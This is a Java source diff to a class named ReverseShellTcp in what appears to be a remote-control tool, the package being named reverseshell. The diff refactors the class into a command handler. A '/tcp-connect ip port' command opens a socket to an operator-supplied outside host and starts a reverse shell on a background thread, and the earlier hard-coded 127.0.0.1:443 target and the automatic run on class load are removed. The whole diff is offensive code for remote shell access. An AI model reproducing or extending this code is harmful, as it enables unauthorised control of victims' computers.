@@ -1,4 +1,7 @@
-package com.mtattab.reverseshell.service;
+package com.mtattab.reverseshell.service.commands;
+
+import com.mtattab.reverseshell.service.Command;
+import com.mtattab.reverseshell.util.DataManipulationUtil;
 
 import java.io.IOException;
 import java.io.InputStream;
@@ -6,12 +9,16 @@ import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.SocketTimeoutException;
+import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
-public class ReverseShellTcp {
+public class ReverseShellTcp implements Command {
     
     // change the host address and/or port number as necessary
-    private static InetSocketAddress addr   = new InetSocketAddress("127.0.0.1", 443);
+    private static InetSocketAddress addr   = null;
     private static String            os     = null;
     private static String            shell  = null;
     private static byte[]            buffer = null;
@@ -68,7 +75,9 @@ public class ReverseShellTcp {
         }
     }
     
-    public static void run() {
+    public static void run(String ip, int port) {
+        addr   = new InetSocketAddress(ip, port);
+
         if (detect()) {
             Socket       client  = null;
             OutputStream socin   = null;
@@ -125,8 +134,34 @@ public class ReverseShellTcp {
     }
     
     static {
-        run();
         System.gc();
     }
-    
+
+    @Override
+    public String executeCommand(String command) {
+        List<String> commands = new ArrayList<>( DataManipulationUtil.stringToList(command, " "));
+        ExecutorService executor = Executors.newSingleThreadExecutor();
+
+        StringBuilder response = new StringBuilder();
+        try {
+            if (commands.get(0).equalsIgnoreCase("/tcp-connect")){
+                commands.remove(0);
+                String ip = commands.get(0);
+                Integer port = Integer.parseInt(commands.get(1));
+                response.append("connecting to "+ip +" on port "+port);
+                executor.submit(() -> {
+                    run(ip,port);
+                });
+
+
+            }
+        }catch (Exception e){
+            e.printStackTrace();
+            response.append("exception occurred while connecting:  "+ e.getMessage());
+        }
+
+        return response.toString();
+    }
+
+
 }
